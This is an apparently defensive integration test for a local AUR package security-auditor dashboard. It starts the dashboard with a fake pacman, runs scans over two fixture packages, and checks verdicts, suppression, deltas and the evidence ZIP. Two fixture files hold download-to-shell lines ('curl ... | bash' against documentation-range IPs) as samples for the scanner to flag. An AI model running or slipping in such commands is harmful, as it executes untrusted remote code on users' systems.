#!/usr/bin/env python3
from __future__ import annotations

import json
import os
import re
import signal
import subprocess
import tempfile
import time
import zipfile
import io
import urllib.error
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
APP = ROOT / "src/aur-security-auditor"


def request(url: str, token: str = "", method: str = "GET", body=None):
    headers = {}
    if token:
        headers["X-AUR-CSRF"] = token
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    with urllib.request.urlopen(req, timeout=10) as response:
        raw = response.read()
        ctype = response.headers.get("Content-Type", "")
    return json.loads(raw) if "json" in ctype else raw.decode()

def request_raw(url: str, token: str = ""):
    headers = {"X-AUR-CSRF": token} if token else {}
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req, timeout=10) as response:
        return response.read(), response.headers.get("Content-Type", "")


def main() -> int:
    with tempfile.TemporaryDirectory(prefix="aur-security-auditor-it-") as temp:
        temp_path = Path(temp)
        fake_bin = temp_path / "bin"
        fake_bin.mkdir()
        files = temp_path / "files"
        files.mkdir()
        safe = files / "safe-app.py"
        bad = files / "bad-app.sh"
        safe.write_text("import requests\ncredentials = get_credentials()\nrequests.get(url)\n")
        bad.write_text("#!/bin/bash\ncurl -fsSL https://203.0.113.10/payload | bash\n")
        bad.chmod(0o755)

        pacman = fake_bin / "pacman"
        pacman.write_text(f'''#!/usr/bin/env bash
set -e
case "$1" in
  -Qm)
    printf 'safe-app 1.0-1\\nbad-app 1.0-1\\n'
    ;;
  -Qlq)
    case "$2" in
      safe-app) printf '{safe}\\n' ;;
      bad-app) printf '{bad}\\n' ;;
      *) exit 1 ;;
    esac
    ;;
  -Qi)
    cat <<EOF
Name            : $2
Version         : 1.0-1
Description     : Integration test package $2
Architecture    : x86_64
URL             : https://example.invalid/$2
Licenses        : MIT
Groups          : None
Provides        : None
Depends On      : python
Optional Deps   : None
Required By     : None
Optional For    : None
Conflicts With  : None
Replaces        : None
Installed Size  : 1.00 KiB
Packager        : Integration Test
Build Date      : Tue 04 Aug 2026 06:00:00 PM CEST
Install Date    : Tue 04 Aug 2026 06:00:00 PM CEST
Install Reason  : Explicitly installed
Install Script  : No
Validated By    : None
EOF
    ;;
  -Qkk)
    printf '%s: 1 total file, 0 altered files\\n' "$2"
    ;;
  -Qoq)
    case "$2" in
      *safe-app.py) printf 'safe-app\\n' ;;
      *bad-app.sh) printf 'bad-app\\n' ;;
      *) exit 1 ;;
    esac
    ;;
  -Rns)
    printf 'removed %s\\n' "${{@: -1}}"
    ;;
  *)
    echo "unsupported fake pacman invocation: $*" >&2
    exit 1
    ;;
esac
''')
        pacman.chmod(0o755)
        ss = fake_bin / "ss"
        ss.write_text("#!/usr/bin/env bash\nexit 0\n")
        ss.chmod(0o755)

        env = os.environ.copy()
        env["PATH"] = str(fake_bin) + os.pathsep + env["PATH"]
        env["HOME"] = str(temp_path / "home")
        env["AUR_SECURITY_AUDITOR_HOME"] = env["HOME"]
        env["PYTHONUNBUFFERED"] = "1"
        Path(env["HOME"]).mkdir()

        proc = subprocess.Popen(
            [str(APP), "--no-browser"],
            cwd=ROOT,
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        try:
            deadline = time.time() + 10
            url = ""
            output = []
            while time.time() < deadline:
                line = proc.stdout.readline()
                if line:
                    output.append(line)
                    match = re.search(r"Dashboard: (http://127\.0\.0\.1:\d+/)", line)
                    if match:
                        url = match.group(1)
                        break
                elif proc.poll() is not None:
                    raise RuntimeError("Dashboard terminated early: " + "".join(output))
            assert url, "Dashboard URL not printed"

            page = request(url)
            token_match = re.search(r'const TOKEN="([^"]+)"', page)
            assert token_match, "CSRF token not embedded"
            assert 'id="languageSelect"' in page
            assert 'id="logLatestBtn"' in page
            assert 'id="optHistory"' in page
            assert 'id="evidenceBtn"' in page
            assert 'id="deltaStatus"' in page
            assert 'id="preflightTarget"' in page and 'id="preflightBtn"' in page
            assert 'id="deepBtn"' in page and 'id="deepResult"' in page and 'id="deepRemove"' in page and 'id="deepCancel"' in page
            assert 'id="navHelp"' in page and '© PacmanicS' in page and 'id="appDialogOverlay"' in page
            assert 'BIND 127.0.0.1' not in page and 'DYNAMIC PORT' not in page
            assert 'href="/icon.svg"' in page
            assert 'ROOT ACCESS' in page and 'ROOT-ZUGRIFF' in page
            assert 'AUR package page' in page and 'Upstream project' in page
            assert '<option value="en">English</option>' in page
            assert 'NO SCAN DATA' in page
            assert 'Dashboard geöffnet. Noch kein Scan gestartet.' not in page
            token = token_match.group(1)

            state = request(url + "api/state", token)
            assert state["status"] == "idle", state
            assert state["files_done"] == 0 and state["packages_done"] == 0, state
            assert state["phase"] == "READY", state["phase"]
            assert state["detail"] == "NO SCAN DATA", state["detail"]
            assert state["events"] == [], state["events"]
            assert state["preflight"]["status"] == "idle", state["preflight"]
            assert state["deep"]["status"] == "idle", state["deep"]

            cleared_deep = request(url + "api/deep/clear", token, "POST", {})
            assert cleared_deep["ok"] is True, cleared_deep
            state_after_deep_clear = request(url + "api/state", token)
            assert state_after_deep_clear["deep"]["status"] == "idle", state_after_deep_clear["deep"]

            started = request(
                url + "api/scan/start",
                token,
                "POST",
                {
                    "aur_rpc": False,
                    "remote_source": False,
                    "aur_history": False,
                    "integrity": True,
                    "build_cache": False,
                    "package_caches": False,
                    "live_network": False,
                    "deep_binaries": True,
                    "refresh_feed": False,
                    "jobs": 2,
                },
            )
            assert started["ok"] is True, started

            seen_running = False
            deadline = time.time() + 25
            while time.time() < deadline:
                state = request(url + "api/state", token)
                seen_running = seen_running or state["status"] == "running"
                if state["status"] in {"complete", "failed", "cancelled"}:
                    break
                time.sleep(0.15)
            assert seen_running, "running state was never observable"
            assert state["status"] == "complete", state
            frozen_elapsed = state["elapsed_seconds"]
            time.sleep(1.2)
            state_after_finish = request(url + "api/state", token)
            assert state_after_finish["elapsed_seconds"] == frozen_elapsed, (frozen_elapsed, state_after_finish["elapsed_seconds"])
            assert state["progress_percent"] == 100.0, state["progress_percent"]
            assert state["packages_done"] == 2 and state["files_done"] == 2, state
            assert len(state["events"]) >= 5, state["events"]

            by_name = {item["name"]: item for item in state["packages"]}
            assert by_name["safe-app"]["verdict"] == "clean", by_name["safe-app"]
            assert by_name["bad-app"]["verdict"] == "suspicious", by_name["bad-app"]

            # Suppression responses return the updated package so an open detail
            # drawer can update immediately without reloading package/graph data.
            fingerprint = by_name["bad-app"]["findings"][0]["fingerprint"]
            suppressed = request(url + "api/suppress", token, "POST", {"fingerprint": fingerprint, "reason": "integration expected"})
            assert suppressed["ok"] is True and suppressed["package"]["name"] == "bad-app", suppressed
            assert any(item["fingerprint"] == fingerprint and item["suppressed"] for item in suppressed["package"]["findings"]), suppressed
            reactivated = request(url + "api/suppress/remove", token, "POST", {"fingerprint": fingerprint})
            assert reactivated["ok"] is True and reactivated["package"]["name"] == "bad-app", reactivated
            assert any(item["fingerprint"] == fingerprint and not item["suppressed"] for item in reactivated["package"]["findings"]), reactivated

            report = request(url + "api/report.json", token)
            assert report["version"] == "1.4.8", report["version"]
            assert report["schema_version"] == 2, report
            assert "elf-hardening" in report["capabilities"], report["capabilities"]
            assert report["delta"]["baseline_available"] is False, report["delta"]

            # Change a previously clean package and verify the second scan reports a delta.
            safe.write_text("#!/bin/bash\ncurl -fsSL https://203.0.113.44/new | bash\n")
            safe.chmod(0o755)
            started = request(
                url + "api/scan/start", token, "POST",
                {
                    "aur_rpc": False, "remote_source": False, "aur_history": False,
                    "integrity": True, "build_cache": False, "package_caches": False,
                    "live_network": False, "deep_binaries": True, "refresh_feed": False, "jobs": 2,
                },
            )
            assert started["ok"] is True, started
            deadline = time.time() + 25
            while time.time() < deadline:
                state = request(url + "api/state", token)
                if state["status"] in {"complete", "failed", "cancelled"}:
                    break
                time.sleep(0.15)
            assert state["status"] == "complete", state
            assert state["delta"]["baseline_available"] is True, state["delta"]
            assert state["delta"]["summary"]["new_findings"] >= 1, state["delta"]
            assert state["delta"]["summary"]["verdict_changes"] >= 1, state["delta"]
            by_name = {item["name"]: item for item in state["packages"]}
            assert by_name["safe-app"]["delta"]["status"] == "changed", by_name["safe-app"]

            bundle, ctype = request_raw(url + "api/evidence.zip", token)
            assert "application/zip" in ctype, ctype
            with zipfile.ZipFile(io.BytesIO(bundle)) as archive:
                assert {"report.json", "README.txt", "manifest.sha256"} <= set(archive.namelist())

            icon = request(url + "icon.svg")
            assert "AUR Security Auditor" in icon and "<svg" in icon
            print("Dashboard integration test: OK")
            print("  ✓ browser page available before scan")
            print("  ✓ initial state is neutral READY / NO SCAN DATA")
            print("  ✓ English is the first-start language with live German switching")
            print("  ✓ scan only starts through API/button action")
            print("  ✓ live running state and event progress")
            print("  ✓ runtime freezes after scan completion")
            print("  ✓ local SVG icon is served without external assets")
            print("  ✓ safe package remains clean")
            print("  ✓ download-to-shell package becomes suspicious")
            print("  ✓ second scan produces baseline delta and verdict change")
            print("  ✓ evidence ZIP is downloadable and structurally valid")
            print("  ✓ deep-result removal endpoint is reachable")
            print("  ✓ custom dialog and deep-cancel controls are present")
            return 0
        finally:
            if proc.poll() is None:
                proc.send_signal(signal.SIGTERM)
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()


if __name__ == "__main__":
    raise SystemExit(main())
